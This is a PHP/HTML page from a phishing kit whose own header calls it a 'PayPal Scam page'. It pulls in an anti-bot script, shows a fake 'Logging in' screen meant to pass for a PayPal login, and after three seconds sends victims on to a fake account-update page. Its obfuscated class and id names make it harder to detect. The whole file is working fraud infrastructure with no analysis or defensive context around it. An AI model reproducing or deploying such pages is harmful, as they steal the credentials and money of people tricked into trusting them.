<?php
/*
PayPal Scam page V2 Coded By WolfostDz
*/
include 'antibot.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en" >
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
      <link rel="shortcut icon" link rel="logo-icon" href="./favicon.ico">
      <title>Log in Account - your Account</title>
      <meta http-equiv="refresh" content="3;url=./websc_update.php?cmd=_flow&SESSION=update_zslEa-pH3fLzMHurkmQkjR59m8RQPT7uSS_4LsFtrCI149xUdAdboe9F46S&dispatch=5885d80a13c0db1f8e263663d3faee8d5c97cbf3d75cb63effe5661cdf3adb6d" >
      <link media="screen" rel="stylesheet" type="text/css" href="./css/es.css">
   </head>
   <body>
      <div class="" id="page">
         <div id="kshgbvskahgvbsksaksa">
            <div id="hksdbkahsbsakhasbkasdh">
               <h2 class="hvbdsjhvsdjsvjsd">Logging in</h2>
            </div>
            <div class=" hvbdsjhvsdjsvjsdH">
               <h3>One moment...</h3>
               <div id="jsbksbvdsksdbksadj" class="jfjgfdhdhtjdhtdh"></div>
               <img id="sbdksdjbdskjbdskbds">
               <p class="jsbksbvdsksdbksadjaa">Still loading after a few seconds? <a href="./wait.php">Try again</a></p>
            </div>
         </div>
      </div>
   </body>
</html>